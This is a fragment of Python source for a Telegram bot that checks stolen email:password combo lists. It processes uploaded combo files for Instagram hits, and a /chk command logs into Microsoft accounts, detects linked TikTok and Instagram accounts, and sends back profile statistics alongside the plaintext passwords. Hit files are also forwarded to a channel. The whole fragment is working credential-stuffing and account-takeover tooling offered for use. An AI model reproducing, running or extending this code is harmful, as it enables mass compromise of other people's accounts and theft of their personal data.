                        bot.send_message(user_id, 
                            f"📸 Hit #{ig_hits}\n"
                            f"👤 @{ig_info['username']}\n"
                            f"👥 {ig_info['followers']:,} followers")

            checked += 1

            if checked % 10 == 0:
                bot.send_message(user_id, f"📊 {checked}/{len(combos)} | Hits: {ig_hits}")

        except Exception as e:
            print(f"[InstagramScan] Error processing combo #{checked+1}: {e}")
            checked += 1
            continue

    if hits:
        file_content = create_new_format_file("Instagram_Full", hits)

        file_obj = BytesIO(file_content.encode('utf-8'))
        file_obj.name = "Instagram_Full.txt"

        bot.send_document(user_id, file_obj,
            caption=f"✅ Complete!\n📊 Checked: {checked}\n📸 Hits: {ig_hits}\n\n💎 @pyabrodie")

        send_to_channel_func(f"Instagram Full: {ig_hits} hits", file_content, "Instagram_Full.txt")
    else:
        bot.send_message(user_id, f"✅ Done!\nChecked: {checked}\n❌ No hits")

    update_last_scan(user_id)

    if user_id in active_scans:
        del active_scans[user_id]
    if user_id in user_sessions:
        del user_sessions[user_id]

@bot.message_handler(content_types=['document'], func=lambda m: user_sessions.get(m.from_user.id, {}).get('mode') == 'instagram_full_capture')
def handle_instagram_file(message):
    user_id = message.from_user.id

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)

        text = downloaded.decode('utf-8', errors='ignore')
        combos = [line.strip() for line in text.split('\n') if line.strip() and ':' in line]

        if not combos:
            bot.send_message(user_id, "❌ No valid combos!")
            return

        bot.send_message(user_id, f"✅ {len(combos)} combos\n🔍 Starting...")

        if not start_scan(user_id):
            bot.send_message(user_id, "⚠️ Du hast bereits einen aktiven Scan!")
            return

        threading.Thread(target=process_instagram_scan, args=(user_id, combos), daemon=True).start()

    except Exception as e:
        bot.send_message(user_id, f"❌ Error: {e}")


# ═══════════════════════════════════════════════════════════════════════════
# /CHK COMMAND - Quick Account Check
# ═══════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['chk'])
def chk_command(message):
    """Quick check command: /chk email:password"""
    user_id = message.from_user.id

    # Check if banned
    if is_banned(user_id):
        return

    # Parse command
    try:
        text = message.text.replace('/chk', '').strip()

        if not text or ':' not in text:
            bot.reply_to(message, 
                "📝 Usage: <code>/chk email:password</code>\n\n"
                "Example:\n"
                "<code>/chk example@hotmail.com:Password123</code>",
                parse_mode='HTML')
            return

        email, password = text.split(':', 1)

        # Start time
        start_time = time.time()

        result = HotmailChecker.check_account(email, password)
        if result.get("status") == "RETRY":
            result = HotmailChecker.check_account(email, password)

        if result["status"] != "HIT":
            # Failed login
            elapsed = time.time() - start_time
            current_time = datetime.datetime.now().strftime("%H:%M:%S")

            fail_msg = f"""❌ <b>Microsoft Account</b>
━━━━━━━━━━━━━━━━━━━━━
📧 <b>Email:</b> {email}
🔑 <b>Password:</b> {password}
📊 <b>Status:</b> BAD
📝 <b>Result:</b> Invalid Credentials

⚡ <b>Time:</b> {elapsed:.1f}s
👤 <b>Bot By:</b> {MY_SIGNATURE}
🤖 <b>Bot:</b> {BOT_USERNAME}
🕐 {current_time}"""

            bot.reply_to(message, fail_msg, parse_mode='HTML')
            return

        # Success - check services
        token = result.get("token")
        cid = result.get("cid")

        services = HotmailChecker.check_services(email, password, token, cid, SERVICES_ALL)

        elapsed = time.time() - start_time
        current_time = datetime.datetime.now().strftime("%H:%M:%S")

        # Main result
        success_msg = f"""✅ <b>Microsoft Account</b>
━━━━━━━━━━━━━━━━━━━━━
📧 <b>Email:</b> {email}
🔑 <b>Password:</b> {password}
📊 <b>Status:</b> HIT
📝 <b>Result:</b> Login Successful

📱 <b>Linked Services ({len(services) if services else 0}):</b>
{chr(10).join(f'• {s}' for s in services) if services else '❌ None'}

⚡ <b>Time:</b> {elapsed:.1f}s
👤 <b>Bot By:</b> {MY_SIGNATURE}
🤖 <b>Bot:</b> {BOT_USERNAME}
🕐 {current_time}"""

        bot.reply_to(message, success_msg, parse_mode='HTML')

        # If TikTok found - send detailed info
        if services and "TikTok" in services:
            tk_result = HotmailChecker.check_tiktok_full(email, password, token, cid)

            if tk_result and tk_result.get('has_tiktok'):
                # Beautiful TikTok format
                tk_username = tk_result.get('username', 'Unknown')
                tk_followers = tk_result.get('followers', 0)
                tk_following = tk_result.get('following', 0)
                tk_likes = tk_result.get('likes', 0)
                tk_videos = tk_result.get('videos', 0)
                tk_verified = tk_result.get('verified', False)

                tiktok_msg = f"""╔══════════════════════════════╗
║     ✅ TIKTOK HIT FOUND      ║
╚══════════════════════════════╝

📧 <b>Email:</b> {email}
🔑 <b>Password:</b> {password}
📧 <b>TikTok Emails:</b> {tk_result.get('tiktok_emails', 0)}

🎵 <b>TIKTOK PROFILE</b>
━━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>Username:</b> @{tk_username}
📛 <b>Name:</b> {tk_username}
🆔 <b>ID:</b> {tk_result.get('user_id', 'N/A')}

📊 <b>STATISTICS</b>
━━━━━━━━━━━━━━━━━━━━━━━━
👥 <b>Followers:</b> {format_number(tk_followers)} ({tk_followers:,})
➕ <b>Following:</b> {format_number(tk_following)} ({tk_following:,})
❤️ <b>Likes:</b> {format_number(tk_likes)} ({tk_likes:,})
📹 <b>Videos:</b> {tk_videos}
👫 <b>Friends:</b> 0

📝 <b>Bio:</b> {tk_result.get('bio', '')}

🔰 <b>Status:</b> {'✅ Verified' if tk_verified else '❌ Not Verified'}
🔒 <b>Private:</b> No
🌍 <b>Country:</b> Unknown 🏳️
📅 <b>Created:</b> Unknown
⏳ <b>Account Age:</b> Unknown

👤 <b>Full Name:</b> {tk_username}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>Developer:</b> {MY_SIGNATURE}
<b>Bot:</b> {BOT_USERNAME}
<b>Time:</b> {current_time}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""

                bot.send_message(user_id, tiktok_msg, parse_mode='HTML')

        # If Instagram found - send detailed info
        if services and "Instagram" in services:
            ig_username = email.split('@')[0]
            ig_info = get_instagram_full_info(ig_username)

            if ig_info:
                flag = get_country_flag(ig_info['country'])

                instagram_msg = f"""╔══════════════════════════════╗
║   📸 INSTAGRAM HIT FOUND     ║
╚══════════════════════════════╝

📧 <b>Email:</b> {email}
🔑 <b>Password:</b> {password}

📸 <b>INSTAGRAM PROFILE</b>
━━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>Username:</b> @{ig_info['username']}
📛 <b>Full Name:</b> {ig_info['full_name']}
🆔 <b>User ID:</b> {ig_info['user_id']}

📊 <b>STATISTICS</b>
━━━━━━━━━━━━━━━━━━━━━━━━
👥 <b>Followers:</b> {ig_info['followers']:,}
➕ <b>Following:</b> {ig_info['following']:,}
📸 <b>Posts:</b> {ig_info['posts']}

📝 <b>Bio:</b> {ig_info['bio']}

📅 <b>Join Date:</b> {ig_info['join_date']}
🌍 <b>Country:</b> {ig_info['country']} {flag}

🔰 <b>Status:</b> {'✅ Verified' if ig_info['is_verified'] else '❌ Not Verified'}
🔒 <b>Private:</b> {'Yes' if ig_info['is_private'] else 'No'}
💼 <b>Business:</b> {'Yes' if ig_info['is_business'] else 'No'}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>Developer:</b> {MY_SIGNATURE}
<b>Bot:</b> {BOT_USERNAME}
<b>Time:</b> {current_time}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""

                bot.send_message(user_id, instagram_msg, parse_mode='HTML')

                # Send profile picture
                if ig_info['profile_pic'] != 'N/A':
                    try:
                        bot.send_photo(user_id, ig_info['profile_pic'])
                    except:
                        pass

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

